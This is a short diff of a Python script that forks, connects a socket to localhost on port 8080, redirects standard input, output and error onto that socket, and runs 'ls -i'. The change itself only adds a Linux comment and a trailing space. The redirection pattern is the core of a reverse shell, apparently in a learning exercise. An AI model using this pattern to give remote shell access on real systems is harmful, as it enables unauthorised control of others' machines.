@@ -1,3 +1,5 @@
+# Make sure to run this on Linux because the fork() function
+
 import socket
 import subprocess
 import os
@@ -13,7 +15,7 @@ except OSError as error:
     if pid > 0:
         print('Fork Not Valid :(')
 socket_handler.connect(("localhost",8080))
-os.dup2(socket_handler.fileno(),0)
+os.dup2(socket_handler.fileno(),0) 
 os.dup2(socket_handler.fileno(),1)
 os.dup2(socket_handler.fileno(),2)
 list_files = subprocess.call(["ls","-i"])
